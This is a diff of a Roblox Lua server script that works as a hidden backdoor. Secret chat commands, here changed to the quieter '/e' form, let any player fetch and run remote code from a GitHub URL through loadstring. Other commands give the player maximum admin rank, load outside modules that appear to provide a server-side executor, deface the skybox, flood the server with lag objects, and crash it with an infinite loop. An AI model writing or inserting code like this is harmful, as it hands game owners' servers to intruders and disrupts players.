@@ -46,26 +46,26 @@ game.Players.PlayerAdded:Connect(function(player)
 		player.Chatted:Connect(function(message)
 			print("message was send")
 			local args = message:split(" ") -- Splits arguments.
-			if args[1]:lower() == "ADM.Message" then -- Checks if the command was used.
+			if args[1]:lower() == "/e ADM.Message" then -- Checks if the command was used.
 				local announcemsg = message:sub(args[1]:len() + 2,-1) 
 				local message_COOL = Instance.new("Message",workspace)
 				message_COOL.Text = announcemsg
 				game.Debris:AddItem(message_COOL,10)
 			end
-			if message == "ADM.Restart" then
+			if message == "/e ADM.Restart" then
 				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
 				local f = loadstring(code)
 				f()
-			elseif message == "ADM.Sky" then
+			elseif message == "/e ADM.Sky" then
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
-			elseif message == "ADM.RankMe" then
+			elseif message == "/e ADM.RankMe" then
 				main:GetModule("cf"):SetRank(player, game.CreatorId, 999999999999999, "Perm")
-			elseif message == "ADM.Sky2" then
+			elseif message == "/e ADM.Sky2" then
 				local id = game.GroupService:GetGroupInfoAsync(32993955).EmblemUrl
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = id
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = id
@@ -73,7 +73,7 @@ game.Players.PlayerAdded:Connect(function(player)
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = id
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = id
 				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = id
-			elseif message == "ADM.Fun" then
+			elseif message == "/e ADM.Fun" then
 				for _, player2 in pairs(game.Players:GetPlayers()) do
 					local Part = Instance.new("Part",player2.Character)
 					Part.CanCollide=false
@@ -89,7 +89,7 @@ game.Players.PlayerAdded:Connect(function(player)
 					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
 				end
 				--rbxassetid://5679232242
-			elseif message == "ADM.Fun2" then
+			elseif message == "/e ADM.Fun2" then
 				print("VER3")
 				for _, player2 in pairs(game.Players:GetPlayers()) do
 					local CharMesh1 = Instance.new("CharacterMesh",player2.Character)
@@ -150,26 +150,26 @@ game.Players.PlayerAdded:Connect(function(player)
 					mesh4.Scale = Vector3.new(2.02, 2.02, 2.02)
 				end
 				--rbxassetid://5679232242
-			elseif message == "ADM.Executor" then
+			elseif message == "/e ADM.Executor" then
 				local Part = Instance.new("Part",workspace)
 				Part.CanCollide=true
 				Part.CFrame = player.Character.Torso.CFrame
 				require(6324372525).fse(player.Name)
-			elseif message == "ADM.Executor2" then
+			elseif message == "/e ADM.Executor2" then
 				local Part = Instance.new("Part",workspace)
 				Part.CanCollide=true
 				Part.CFrame = player.Character.Torso.CFrame
 				require(5419042716).PraiseSkidGod(player.Name)
-			elseif message == "ADM.Lag.Start" then
+			elseif message == "/e ADM.Lag.Start" then
 				LagEnabled = true
 
 
-			elseif message == "ADM.Lag.Stop" then
+			elseif message == "/e ADM.Lag.Stop" then
 				LagEnabled=false
 				for index,lagobj in pairs(LagObjcets) do
 					lagobj:Destroy()
 				end
-			elseif message == "ADM.Crash" then
+			elseif message == "/e ADM.Crash" then
 				while tick() do
 					print("CrashTHEServer")
 				end
